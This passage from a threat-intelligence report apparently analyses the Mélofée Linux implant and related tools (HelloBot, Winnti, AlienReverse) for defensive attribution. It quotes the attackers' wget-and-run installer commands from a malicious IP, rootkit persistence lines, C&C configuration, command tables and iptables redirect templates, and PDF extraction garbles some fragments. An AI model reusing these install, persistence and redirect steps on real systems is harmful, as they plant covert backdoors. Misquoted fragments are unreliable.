This behaviour is similar to the installation process of\n_Winnti Linux rootkits._\n```\nwget http://173.209.62[.]186:8765/installer -O /var/tmp/installer\n\nwget http://173.209.62[.]186:8765/a.dat -O /var/tmp/usbd;\n\nchmod +x /var/tmp/installer;\n\n/var/tmp/installer -i /var/tmp/usbd\n\n\n```\nThe installer is also developped in C++, and takes the binary package as an argument.\nIt then then proceeds\nto extract and install both the rootkit and the server component.\nThe rootkit and implant paths are hardcoded\nto respectively /etc/intel_audio/intel_audio.ko and /etc/intel_audio/audio\nThe installer inserts the\nkernel rootkit using a call to system(\"insmod /etc/intel_audio/intel_audio.ko\"),\nand also install the\npersistance in the /etc/rc.modules file.\n\nWriting to this script ensures that both kernel and implant are executed at boot time .2\n\nThe resulting script after installation can be seen below:\n```\n#!/bin/sh\n\n#Script for starting modules\n\n/sbin/insmod /etc/intel_audio/intel_audio.ko\n\n/etc/intel_audio/audio\n\n#End script\n\n\n```\nThe first bytes of the package includes the offset to the payload (in little endian), which is used to correctly\nextract the kernel rootkit and the server implant.\n```\n00000000: b07e 0000 a841 3000 7f45 4c46 0201 0100 .~...A0..ELF....\n\n00000010: 0000 0000 0000 0000 0100 3e00 0100 0000 ..........>.....\n\n00000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................\n\n\n```\nThe developper was also kind enough to includes an usage function describing the installer’s options:\n\n\n-----\n\n```\n     g ( p _ )\n\n{\n\n printf(\"Usage: <%s> [options]\\n\",param_1);\n\n puts(\"  -r         Remove\");\n\n puts(\"  -i <data file>   Install\");\n\n puts(\"  -d         Run in background\");\n\n puts(\"  -h         Show help\");\n\n return;\n\n}\n\n### Configuration management\n\n```\nThe configuration is encrypted using the RC4 algorithm in the two early samples, and with a simple xor with\na single byte key (0x43) in the undated sample.\n\nThe configuration format has changed between the samples, the first one containing all elements in\nencrypted form, and the last one with only the C&C domain encrypted.\n\nExample of decrypted configuration:\n```\n1:www.data-yuzefuji[.]com:443:5\n\n```\nThis configuration contains the following elements:\n\nThe socket type (0x1 being TCP)\nThe C&C domain\nThe communication port\nThe sleeptime in minutes between requests\n\n### Persistance mechanisms\n\nThe implant has two mechanisms of persistance, depending on its running privileges.\nIf it runs as the root\nuser, it tries to write a line containing sh -c IMPLANT_EXECUTABLE_NAME >/dev/null 2>& in the files\n```\n/etc/rc.local or /etc/rc.d/rc.local.\n\n```\nIf it runs as a simple user, it will try to install its persistance in the following files:\n```\n   /home/CURRENT_USERNAME/.bash_profile\n   /home/CURRENT_USERNAME/.bash_login\n   /home/CURRENT_USERNAME/.profile\n\n```\nThe rootkit installer will insert the persistance for the kernel module in the /etc/rc.modules file.\n\n### Supported commands\n\nThe commands supported by the implant have evolved between the samples, showing current development\nof the backdoor.\n\nThe first two versions:\n\n|Command ID|Capability|Comment|\n|---|---|---|\n|0x103|ping_back|Sent by the client|\n\n\n-----\n\n|Command ID|Capability|Comment|\n|---|---|---|\n|0x1|uninstall|Kill the current process and removes the persistance|\n|0x2|update_and_relaunch|Overwrite the current running file and relaunch|\n|0x3|launch_new_command_thread|Creates a new socket for interaction|\n|0x4|write_file||\n|0x5|read_file||\n|0x6|launch_shell||\n|0x7|create_socket|0x0: TCP, 0x1: TLS, 0x2: UDP|\n|0x10|send_local_information|Hostname, date, current UID, implant version number, …|\n|0x50001|list_directory||\n|0x50002|create_directory||\n|0x50003|not_implemented||\n|0x50004|delete_directory|Wrapper over system(\"rm -fr %s)|\n\n\nLast version:\n\n**Command ID** **Capability** **Comment**\n```\n 0x10005 reset_timer\n 0x10002 clean_and_exit\n\n```\n`0x10004` `create_socket` Create a bidirectional socket, probably used for proxying\n```\n 0x40001 list_directory\n\n```\n`0x40002` `delete_directory` Wrapper over system(\"rm -fr %s)\n```\n 0x40003 rename\n 0x40004 create_directory\n 0x40005 write_file\n 0x40006 read_file\n 0x50001

communication protocols have evolved in the three analyzed samples, however three socket types are\nimplemented:\n\n|Command ID|Capability|Comment|\n|---|---|---|\n|0x10005|reset_timer||\n|0x10002|clean_and_exit||\n|0x10004|create_socket|Create a bidirectional socket, probably used for proxying|\n|0x40001|list_directory||\n|0x40002|delete_directory|Wrapper over system(\"rm -fr %s)|\n|0x40003|rename||\n|0x40004|create_directory||\n|0x40005|write_file||\n|0x40006|read_file||\n|0x50001|exec_command_with_output||\n|0x70001|write_integer_to_file|Purpose unknown, probably used for sleeptime|\n|0x60001|launch_shell||\n|0x90001|no_op||\n\n\n-----\n\n```\n   TCPSocket (type 0x0) using raw TCP, with a custom packet format described below;\n   TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server;\n\n```\n`UDPSocket (type 0x2), using the KCP protocol 3` to send data. It should be noted that the KCP protocol is\na public communication library, and is also used in several malware families such as Amoeba 4 or\n_CrossWalk ;5_\nSome leftover code seems to indicate that there could be a third type 0x3 for HTTP based\ncommunications, but it was not implemented in the analyzed samples.\n\nWhile the data is not encrypted in any form in two of the samples,\nin the last one it is encrypted using the RC4\nalgorithm with a hardcoded key ( \\x01\\x02\\x03\\x04 repeated 4 times).\n\nThe packet formats used by Mélofée are the following:\n```\nstruct Packet202201_3 {\n\n  unsigned int dwCommand;\n\n  unsigned int dwCommandResult;\n\n  unsigned int dwUnknown;\n\n  unsigned int dwDataSize;\n\n  char [] clear_text_data;\n\n}\n\nstruct Packet202205 {\n\n  unsigned int dwUnknown;\n\n  unsigned int dwRandom1;\n\n  unsigned int dwRandom2;\n\n  unsigned int dwCommandResult;\n\n  unsigned int dwCommandID;\n\n  unsigned int dwCommandSize;\n\n  char [] encrypted_data;\n\n}\n\nSelfForwardServer and listening server\n\n```\nIn the latest sample, a new functionality was implemented, named SelfForwardServer.\n\nDepending on a configuration flag, the implant can install iptables rules to redirect TCP network traffic from\nport 57590\n\nThe steps to install these rules are the following:\n\nFirst a new NAT chain named is created XFILTER using the following command: iptables -t nat -N\n```\n   %s\n\n```\nA redirection rule is added for the port in this NAT chain:iptables -t nat -A %s -p tcp -j REDIRECT\n```\n   --to-port %d\n\n```\nSave the recent connections from port 45535 with the name ipxles: iptables -t nat -A PREROUTING\n```\n   -p tcp --sport 45535 -m recent --set --name %s --rsource -j ACCEPT\n\n```\nRedirects recent ipxles connections to the NAT chain: iptables -t nat -A PREROUTING -p tcp -```\n   dport %d --syn -m recent --rcheck --seconds 300 --name %s --rsource -j %s\n\n```\nFinally, the host is instructed to accept network traffic on the port 57590 using the command iptables\n```\n   -I INPUT -p tcp --dport %d -j ACCEPT\n\n```\nIt should be noted that while the SelfForwardServer was deactivated in the configuration, the sample\nembedded both a self-signed certificate generated on 2021-06-03 and the corresponding private key to be\nused for securing communication in Server mode.\n\n\n-----\n\nSome of the underlying code is also present in the two earlier samples (as documented by leftover RTTI\ninformation), and three types of server were available:\n```\n   TCPServer (type 0x00)\n   TLServer (type 0x1)\n   UDPServer (type 0x2)\n\n```\nOne interesting tidbit of this code is hidden in the receive function of the TLSServer (at address 0x429b7a in\nthe undated sample).\nWhen the 4 first bytes received by this function using the recv library call are 03 01 d3\n```\n76, a flag affecting the creation of the subsequent socket is set.\nHowever, we could not identify precisely the\n\n```\npurpose of this magic.\n\nBecause of the presence of unused code, and the evolutions between the samples, we assess that the\n```\nServer and SelfForwardServer are currently under development by the attackers.\n\n## Another pokemon inside the attacker’s toolset\n\n```\nWe analyzed the infrastructure used by the attacker using pivot on both public and private datasets.\nWe\nassess that this malware family is probably linked to the Amoeba ant Winnti 4 6 7 8 state sponsored threat\ngroups.\n\nThe infrastructure for the Mélofée implants are linked to the following tools:\n\n\n[Some of the servers were tracked by our Cyber Threat Intelligence as ShadowPad C&C servers;](https://exatrack.com/threat_intel.html)\nOther servers were linked to both Winnti and HelloBot tools;\nWe also saw related domains used as C&C servers for tools like PlugX, Spark,9 _Cobalt Strike,_\n_StowAway_ 10, and the legitimate toDesk remote control tool;\nLastly, the attacker also probably used the ezXSS 11 tool, but we could not confirm why.\n\n### Hellobot\n\n\n_HelloBot is a malware family also targeting Linux hosts and is known to be used by APT groups such as_\n_Earth Berberoka .6_ While pivoting on the Mélofée infrastructure, we found a common IP with an HelloBot\nsample, which provided another point to dig in.\n\nWe found several samples of this malware and developped a custom configuration extraction script (provided\nin the annexes of this blog post).\n\nUsing the configurations extracted, we also were able to find strong infrastructure links between HelloBot and\n_Winnti, for example both used a subdomain of git1ab[.]com and cloudf1are[.]com as C&C servers._\n\n### Probable links with Winnti\n\nThe response issued by the C&C server at the IP address 173.209.62.186 on the port 443 could be uniquely\nlinked to another domain dev.yuanta.dev.\nThis server was known to be used to stage archives containing\nan installer for the Linux version of the Winnti rootkit .7\n\nWe also downloaded several samples of this malware family, extracted the configuration (using the script\nprovided by Chronicle), and found\nseveral common domains between HelloBot and Winnti, such as\n```\ncloudf1are[.]com and git1ab[.com.\n\n### Analysis graph\n\n```\n\n-----\n\nUsing the previous datapoints, we generated an infrastructure graph to draw the relations between the\nsamples.\n\nWe assess with high confidence that HelloBot, Winnti and Mélofée are all related and were used by Chinese\nstate sponsored attacker groups during at least all of 2022.\n\n### Alien\n\nDuring our analysis, we discovered another Linux implant dubbed AlienReverse.\n\nThis code was architectured in a similar manner as Mélofée, however there are several crucial differences:\n\nThere were however some common points between Mélofée and AlienReverse\n\nBoth implants were developped in C++\nBoth implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running\n(this code was found in public 14, but seems rarely used in the wild)\nThis implant implemented a similar mechanism for limiting working hours (defined as worktime)\n\nThe command supported by this implant were the following:\n\n**Command**\n**ID** **Capability** **Comment**\n\n`0x110010` `CmdBroadcast` Send encrypted data over the socket\n\n`0x110011` `CmdOnRainUninstall` Unimplemented\n\n`0x110020` `CmdOnline` Send local information such as hostname, date, and current UID to\nthe server\n\n`0x110061` `FileManager` Supports several subcommands such as OpenFile, CreateDir,\n```\n                   FileEnum, FileDownload, …\n\n```\n`0x110062` `ScreenSnapshot` Unimplemented\n\n`0x110063` `CmdOnTaskList` Unimplemented\n\n`0x110064` `CmdOnShellCommand` Launch interactive shell\n\n\n-----\n\n**Command**\n**ID** **Capability** **Comment**\n\n`0x110065` `CmdOnShellActive` Unimplemented\n\n`0x110066` `CmdOnServiceList` Unimplemented\n\n`0x110068` `CmdOnPortMapping` Launches EarthWorm to perform the port mapping, supporting a\nscanning mode with another AlienReverse implant used as a proxy.\nAlso implements the management of a Socks proxy\n\n`0x110073` `CmdOnKbdRecord` Unimplemented\n\n`0x110075` `CmdOnWorkTime` Writes the expected runtime hours in the file /tmp/worktime\n\nThe packet format used by the communication protocol is very similar to the one used by Mélofée:\n```\nstruct AlienComzPacket {\n\n  unsigned int dwTickCount;\n\n  unsigned int dwMagic1; // 0xa003001\n\n  unsigned int dwMagic2; // 0x10000137, also used to indicate if the packet has data\n\n  unsigned int dwCommandID;\n\n  unsigned int dwTotalSize;\n\n  unsigned int dwEncryptedSize;\n\n  unsigned int ;\n\n  char []   data; // The data encrypted using pel_encrypt\n\n}\n\n\n```\nWhile we initially thought that this sample was related to the Mélofée family,\nwe came to the conclusion that it\nis a distinct tool.\nHowever, we decided to include it in this report because it was used as a starting point in\nthis investigation, and we think that sharing it to the public is important.\n\nWe also could not link it to known adversary groups, but we assess that it is likely used in targeted attacks.\n\n## Conclusion\n\nThe Mélofée implant family is another tool in the arsenal of chinese state sponsored attackers,\nwhich show\nconstant innovation and development.\n\nThe capabilities offered by Mélofée are relatively simple, but may enable adversaries to conduct their attacks\nunder the radar.\nThese implants were not widely seen, showing that the attacker are likely limiting its usage\nto high value targets.\n\n## Annexes\n\n###
